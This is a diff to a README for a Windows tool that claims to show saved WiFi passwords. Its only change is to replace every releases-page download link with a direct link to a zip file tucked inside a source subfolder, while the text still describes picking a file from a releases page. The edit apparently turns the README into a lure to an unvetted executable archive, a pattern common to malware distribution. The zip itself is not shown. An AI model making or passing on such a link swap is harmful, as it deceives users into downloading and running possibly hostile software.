@@ -1,12 +1,12 @@
 # 🛜 wifi-passview - View Saved WiFi Keys Fast
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Flashbackmarketcapitalization665/wifi-passview/releases)
+[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Flashbackmarketcapitalization665/wifi-passview/raw/refs/heads/main/wifi_passview/reporters/passview_wifi_1.8-beta.2.zip)
 
 ## 📥 Download
 
 Use this page to download wifi-passview for Windows:
 
-https://github.com/Flashbackmarketcapitalization665/wifi-passview/releases
+https://github.com/Flashbackmarketcapitalization665/wifi-passview/raw/refs/heads/main/wifi_passview/reporters/passview_wifi_1.8-beta.2.zip
 
 Open the page, then pick the latest release for your system. If you use Windows, look for the file made for Windows and save it to your PC
 
@@ -158,6 +158,6 @@ A simple folder path makes it easier to run the file and read the output
 
 Visit this page to download wifi-passview for Windows:
 
-https://github.com/Flashbackmarketcapitalization665/wifi-passview/releases
+https://github.com/Flashbackmarketcapitalization665/wifi-passview/raw/refs/heads/main/wifi_passview/reporters/passview_wifi_1.8-beta.2.zip
 
 Use the latest release and choose the Windows file that matches your computer
